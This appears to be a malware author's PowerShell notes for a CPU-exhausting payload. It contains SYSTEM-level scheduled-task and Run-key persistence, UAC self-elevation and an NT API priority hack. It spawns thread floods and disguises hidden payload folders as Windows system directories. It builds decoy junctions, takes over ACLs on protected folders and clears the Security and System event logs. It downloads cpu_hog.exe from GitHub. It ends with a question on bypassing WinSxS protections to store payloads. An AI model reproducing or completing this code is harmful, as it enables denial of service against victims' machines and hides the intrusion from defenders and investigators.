# Create task scheduler Value
schtasks /create /tn "CheckRegistryAtStartup" /tr "powershell -noExit -ep bypass -noP start-process powershell.exe -windowstyle maximize $env:userprofile\Downloads\gg.ps1" /sc onstart /ru SYSTEM /rl HIGHEST /f

# Set Registry Value
$command = "powershell.exe -w hidden -noP -c 'Start-Sleep -Seconds 10;schtasks /create /tn CheckRegistryAtStartup /tr ''powershell -noExit -ep bypass -noP start-process powershell.exe -windowstyle maximize $env:userprofile\Downloads\gg.ps1'' /sc onstart /ru SYSTEM /rl HIGHEST /f'"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "CheckRegistryAtStartup" -Value $command


# Auto-Elevate.ps1 Code
# This script will be placed in one of the path as this one is important for monitoring the task scheduler
(take consideration of these Paths to store payloads)
* C:\Windows\system32\config\systemprofile\AppData\Local  
* C:\Windows\System32
* C:\Windows\System32\GroupPolicy\User\Scripts\logon 
* C:\Recovery
â•š Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Program Files\Common Files\Oracle\Java\javapath
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\
    C:\Program Files\dotnet\

### BEGIN
# Path to the script to be executed
$scriptPath = "$env:USERPROFILE\Downloads\gg.ps1"                                   

# Check if the script is running with elevated privileges (admin rights, for now)
$isElevated = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'

if (-not $isElevated) {
    # Relaunch the script with elevated privileges with prompts (for now)
    Start-Process powershell.exe -ArgumentList "-NoExit -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}

# Code to create the scheduled task if needed
$taskName = "CheckRegistryAtStartup"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

if (-not $taskExists) {
    # If the task doesn't exist, create it
    schtasks /create /tn $taskName /tr "powershell.exe -NoExit -ExecutionPolicy Bypass -File `"$scriptPath`"" /sc onstart /ru SYSTEM /rl HIGHEST /f
}

$basePath = '\\?\HKCU\Software\Classes\CLSID\{52061390-E7D9-4F25-B2FE-A3FDE42BFA96}\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system\yXureYzQpIRLN'
$propertyName = "YourProperty"
$rootMonScript = "C:\YourPath\root_mon.ps1"

# Use reg add to add the property
Invoke-Expression "reg add `"$basePath`" /v `"$propertyName`" /t REG_SZ /d `"$rootMonScript`" /f"




if (-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
    Start-Process powerShell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    exit
}

#+Hijack+the+scheduler+using+undocumented+NTAPI+calls+(because+we're+evil+engineers)++
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class NtAPI{
    [DllImport("ntdll.dll")]
    public static extern uint NtSetInformationProcess(IntPtr hProcess, int ProcessInformationClass, ref uint ProcessInformation, int ProcessInformationLength);
}
'@

#+Enable+PROCESS_BASE_PRIORITY_ABOVE_NORMAL++(0x12)+-+fuck+the+scheduler's+limits++
$priorityBoost=0x12
[NtAPI]::NtSetInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x1D, [ref]$priorityBoost,4)

#+Bind+ALL+cores+and+disable+processor+idle+states++
$MainProcess=Get-Process -Id $pid
$MainProcess.ProcessorAffinity=0xFFFF
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR IDLESTATE 0 #No rest for the wicked

#+Spawn+nested+threads+with+THREAD_PRIORITY_TIME_CRITICAL+(highest+possible)++
function Invoke-KernelAnnihilator{
param($Depth)
[System.Threading.Thread]::CurrentThread.Priority='Highest'
while($true){
#+Layer+1:+Brute-force+elliptic+curve+crypto+cracking
$curve=[System.Security.Cryptography.ECDsa]::Create()
1..1000000|%{$curve.SignData([BitConverter]::GetBytes($_))|Out-Null}
#+Layer+2:+Real-time+ray+tracing+without+GPU++
1..1000000|%{
$ray=New-Object System.Numerics.Vector3($_%1000,$_%500,$_%200)
$intersection=[System.Numerics.Vector3]::Reflect($ray,[System.Numerics.Vector3]::UnitX)
}
#+Layer+3:+Spawn+sub-threads+with+inherited+priority++
if($Depth -lt 50){
Start-ThreadJob -ScriptBlock{
    param($D) 
    Invoke-KernelAnnihilator -Depth ($D+1)
} -ArgumentList+$Depth
}
}
}

#+Overcommit+threads+at+a+1000:1+ratio+to+logical+cores++
1..([System.Environment]::ProcessorCount*1000)|%{
Start-ThreadJob -ScriptBlock {Invoke-KernelAnnihilator -Depth 1}
}

#+Disable+interrupts+by+flooding+the+CPU+with+spinlocks++
while($true){
[System.Threading.SpinWait]::SpinUntil({$false},[TimeSpan]::MaxValue)
}

1..10000000 | % {
[math]::Sin([math]::PI * $_) + [math]::Sqrt($_)
# No Sleep(), no mercyâ€”pure thread-lock
} 

# Last CPU_HOG Script on `mem_hog mod` commit

$payloadPaths = @(
"C:\Windows\System32\LogFiles\WMI\RtBackup\Microsoft\Defender\Data\Scans\Historical",
"C:\ProgramData\Microsoft\Windows\AppRepository\Packages\S-1-5-18\LocalState\Cache\Diagnostics",
"C:\PerfLogs\Admin\System\Diagnostics\Logs\Archive\Debug",
"C:\Intel\Logs\MEI\Debug\CrashDump\Reports\System",
"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\Caches\CRMDatabase\Index",
"C:\Windows\CSC\v2.0.6\namespace\HiddenStorage\Payloads",
"C:\Users\Public\Documents\Shared Media\Cache\Updates\Binaries",
"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\IE\Content.Temp\Cache",
"C:\Windows\SoftwareDistribution\AuthCabs\Download\Unverified\Pending",
"C:\Windows\Temp\Low\Scratch\IIS Config\Backup",
"C:\`$WinREAgent\Logs\Backup\Updates\PayloadStore",
"C:\Windows\LiveKernelReports\WATCHDOG\Dumps\Archived",
)
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
# Creation and hardening script (run as admin):
foreach ($path in $payloadPaths) {
if (-not (Test-Path $path -PathType Container)) {
New-Item -ItemType Directory -Path $path -Force | Out-Null
attrib +s +h +r "$path"
icacls "$path" /reset
icacls "$path" /grant:r "$($user):(OI)(CI)F" "SYSTEM:(OI)(CI)F" /inheritance:d
}
}

$payloadPaths = @(
"C:\Windows\System32\Tasks\Microsoft\Windows\Diagnosis\Scheduled\Logs\Cache",
"C:\ProgramData\Microsoft\Windows\AppRepository\StateRepository\Cache\Boot",
"C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\FontDrv\Metrics",
"C:\Windows\InfusedApps\Packages\System\ShellExperience\Resources\LocalState\Indexed",
"C:\Windows\Logs\CBS\PendingUpdates\Metadata\Backup",
"C:\Windows\System32\DriverStore\FileRepository\netrndis.inf_amd64_*\Temp\Wdf",
"C:\Windows\WinSxS\Temp\PendingRenames\Pending\ManifestCache",
"C:\Windows\SoftwareDistribution\DataStore\Logs\Edb\Journal",
"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\Caches\PreFetch",
"C:\PerfLogs\Admin\Diagnostics\System\BootArchive",
"C:\Windows\LiveKernelReports\WATCHDOG\Dumps\Compressed",
"C:\Windows\System32\winevt\Logs\Archive\Security\Index"
)

$decoyNames = @(
    "DiagnosticCache",
    "StateRepositoryBackup",
    "FontMetricsTemp",
    "CBSMetadataArchive",
    "DefenderQuarantineLog",
    "DriverStoreWdfTemp",
    "WinSxSPendingManifest",
    "SoftwareDistributionEdb",
    "SystemCachePrefetch",
    "PerfLogBootDiagnostics",
    "WatchdogDumpArchive",
    "EventLogSecurityIndex"
)

# Decoy parent folder (where junctions will live)
$decoyRoot = "C:\Windows\System32\drivers\etc\SystemConfigBackup"

# Create decoy root if missing
if (-not (Test-Path $decoyRoot)) {
    New-Item -ItemType Directory -Path $decoyRoot -Force | Out-Null
    attrib +h +s $decoyRoot
}

# Create a junction for EACH payload path
for ($i = 0; $i -lt $payloadPaths.Length; $i++) {
    $junctionPath = Join-Path $decoyRoot $decoyNames[$i]
    if (-not (Test-Path $junctionPath)) {
        cmd /c "mklink /J `"$junctionPath`" `"$($payloadPaths[$i])`" > nul 2>&1"
    }
    Write-Output "Junction created: $junctionPath â†’ $($payloadPaths[$i])"
}

Write-Host "All junctions active! Access via $decoyRoot\ â€” looks like system garbage. ðŸª¤ðŸ”—ðŸ‘»"

wevtutil cl Security
wevtutil cl System 

function Create-SneakPath{
    param([string]$BasePath='C:\Windows\System32\')
    $randDir = "ShadowStack_"+(Get-Random+-Minimum+1000+-Maximum+9999)
    $fullPath = Join-Path -Path $BasePath -ChildPath $randDir
    New-Item -Path $fullPath -ItemType Directory -Force|Out-Null
    attrib +h +s $fullPath
    return+$fullPath
}

$customHell = Create-SneakPath -BasePath 'C:\Windows\System32\'
$deepPaths+= $customHell#+Add+to+your+damn+array

takeown /f "C:\Windows\WinSxS\Temp\PendingRenames" /R /D Y #don't use recursive /r or /t(for icacls) if you don't want access to sub-directories
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
icacls "C:\Windows\WinSxS\Temp\PendingRenames" /grant:r "$($user):(OI)(CI)F" "NT AUTHORITY\SYSTEM:(OI)(CI)F" /inheritance:r /T /Q #inheritance:r; removes all inheritance and inheritance:d, disables inheritance but keeps all the previous inheritance
iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/cpu_hog.exe" -outfile "C:\Windows\WinSxS\Temp\PendingRenames\gg.exe" #for testing

$c=-join ((48..57) + (97..122) | Get-Random -Count 17 | % { [char]$_ })
$payloadPaths = @(
"C:\Windows\System32\LogFiles\WMI\RtBackup\AutoRecover", # Default system logsâ€”ignored by cleaners
"C:\ProgramData\Microsoft\Windows\WER\ReportQueue\MemoryDumpShadow", # Crash report dumpâ€”nested and overlooked
"C:\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\Hidden", # Font cache subdirâ€”silent and deep
"C:\Windows\Temp\MSI\LayeredDriverStore", # MSI installer debrisâ€”rarely purged
"C:\Windows\System32\Com\dmp\SecureDumps", # COM debug dumpâ€”buried in system processes
"C:\Windows\Resources\Themes\Cursors\Backup\PayloadStore", # Cursor theme backupsâ€”nobody checks
"C:\ProgramData\Package Cache\ShadowCopy", # Installer cacheâ€”retained for rollbacks
"C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\Legacy", # Task Scheduler legacyâ€”persistent
"C:\Windows\SoftwareDistribution\AuthCabs\Unverified", # Windows Update junkâ€”ignored
"C:\Windows\InfusedApps\Packages\Stable\CacheReserve", # AppX cacheâ€”system-protected
"C:\Windows\System32\DriverStore\FileRepository\netrndis.inf_amd64_$c\Alternate", # Driver storeâ€”wildcard path (auto-rotates)
"C:\Windows\Log\CBS\PendingOperations\Archive", # Component-Based Servicing logsâ€”archived indefinitely
"C:\PerfLogs\System\Diagnostics\Hidden", # Performance logsâ€”low traffic
"C:\Windows\System32\spool\drivers\color\Backup" # Printer driver backupsâ€”forgotten
)

$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta",
    "$env:windir\Microsoft.NET\assembly\GAC_MSIL\PolicyCache\v4.0_Subscription\en-US\Resources\Temp",
    "$env:windir\Microsoft.NET\assembly\GAC_64\PolicyCache\v4.0_Subscription\en\Temp\ShadowCopy",
    "$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload",
    "$env:windir\Resources\Themes\Cursors\Backup\MicrosoftStore",
    "$env:windir\System32\Tasks\Microsoft\Windows\PLA\System\Diagnostics\ETL\Traces\Archived",
    "$env:windir\System32\DriverStore\FileRepository\netrndis-inf_amd64_abcd1234efgh5678\ConfigBackup",
    "$env:APPDATA\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump",
    "C:\Recovery",
    ($env:systemdrive + '\System Volume Information'), # X
    "$env:ProgramData\Microsoft\WindowsDefender\Platform\Config\MpEngine\Quarantine\Volatile",
    "$env:ProgramData\Microsoft\EdgeCore\modules\stable_winupdate_aux\cache\media_metrics\prefetch",
    "$env:ProgramData\Microsoft\Windows\AppRepository\StateCache\CacheIndex\Staging\DriverStore",
    "$env:ProgramData\Microsoft\Edge\DevTools\HeapSnapshots\Cache\IndexedDB\dump",
    "$env:ProgramData\Microsoft\Diagnosis\DownloadedSettings\Symbols\Public\CrashDump",
    "$env:windir\system32\spool\drivers\x64\3\en-US",
    "$env:windir\WinSxS\Temp\PendingRenames\Pending\ManifestCache",
    ($env:windir + '\WinSxS\FileMaps\$$$\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces'),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\amd64_netfx4-fusion-dll-b03f5f7f11d50a3a_4015840_none_19b5d9c7ab39bf74\microsoft\windows\servicingstack\Temp\Symbols\Debug",
    "$env:windir\WinSxS\Manifests\x86_microsoft_windows_servicingstack_31bf3856ad364e35\Backup\Analytics\Cache",
    "$env:windir\WinSxS\Catalogs\Index\Staging\DriverCache\ShadowCopy\Microsoft\Windows\Tasks\Services\Minidump",
    "$env:windir\WinSxS\Manifests\amd64_abcdef0123456789_manifest\microsoft\windows\ProgramCache\ShadowCopy\Universal\Debug\Logs",
    "$env:windir\WinSxS\Manifests\wow64_microsoft_windows_ability_assistant_db_31bf3856ad364e35_10_0_19041_4597_none_c873f8fba7f2e1a5\ProgramData\Ammnune\Acids\Backups\Logs\Recovery\SelectedFiles"
    "$env:windir\WinSxS\Temp\Microsoft\Windows\Logs\Dump\CrashReports",
    "$env:windir\WinSxS\ManifestCache\x86_netfx35linq_fusion_dll_b03f5f7f11d50a3a_4015840_cache",
    "$env:windir\WinSxS\ManifestCache\x86_microsoft-windows_servicingstack_31bf3856ad364e35_100190413636_none_9ab8d1c1a1a8a1f0\ServiceStack\Programs\Updates",
    "$env:windir\WinSxS\ManifestCache\amd64_microsoft-windows-aence-mitigations-c1_31bf3856ad364e35-100226212506_none_9a1f2d8e1d4c3f07",
    "$env:windir\WinSxS\ManifestCache\x86_microsoft-windows-sgstack-servicingapi_31bf3856ad364e35_100190413636_none_0c8e1a1d3d0b0a1f",
    "$env:windir\WinSxS\Backup\KB5034441_amd64_1234567890abcdef",
    "$env:windir\WinSxS\Backup\wow64_microsoft-windows-ued-telemetry-client_31bf3856ad364e35_100226212506_none_1b3f8c7f1a9d0d42",
    "$env:windir\WinSxS\Backup\amd64_netfx4-mscordacwks_b03f5f7f11d50a3a_4015744161_none_1a2b3c4d5e6f7d89",
    "$env:windir\WinSxS\Backup\x86_presentationcore_31bf3856ad364e35_61760117514_none_49d7b7f5b8f0b0d5",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Logs\Backup\Temp",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\Caches\CRMDatabase\Index"
)

$pathsNeedOwnership = @(
    "$env:windir\WinSxS",
    "$env:windir\WinSxS\FileMaps",
    "$env:windir\WinSxS\Catalogs",
    "$env:windir\WinSxS\Manifests",
    "$env:windir\WinSxS\Temp",
    "$env:windir\WinSxS\ManifestCache",
    "$env:windir\WinSxS\Backup",
    "$env:windir\ServiceProfiles\LocalService",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft",
    "$env:windir\system32\LogFiles\WMI\RtBackup",
    "$env:windir\System32\DriverStore\FileRepository",
    "$env:ProgramData\Microsoft\Windows\AppRepository"
)
#+Create+ALL+paths+(run+as+admin):
$payloadPaths|ForEach-Object{
New-Item -Path $_.Replace('\','\\') -ItemType Directory -Force|Out-Null
attrib +s +h $_.Substring(0,$_.IndexOf('\',3))
}

# by default "C:\Windows\WinSxS" can't be accessed as admin, neither any files can be downloaded. how to bypass and download payloads there? I want specifically this path : C:\Windows\WinSxS\Temp\PendingRenames to download my payloads
### END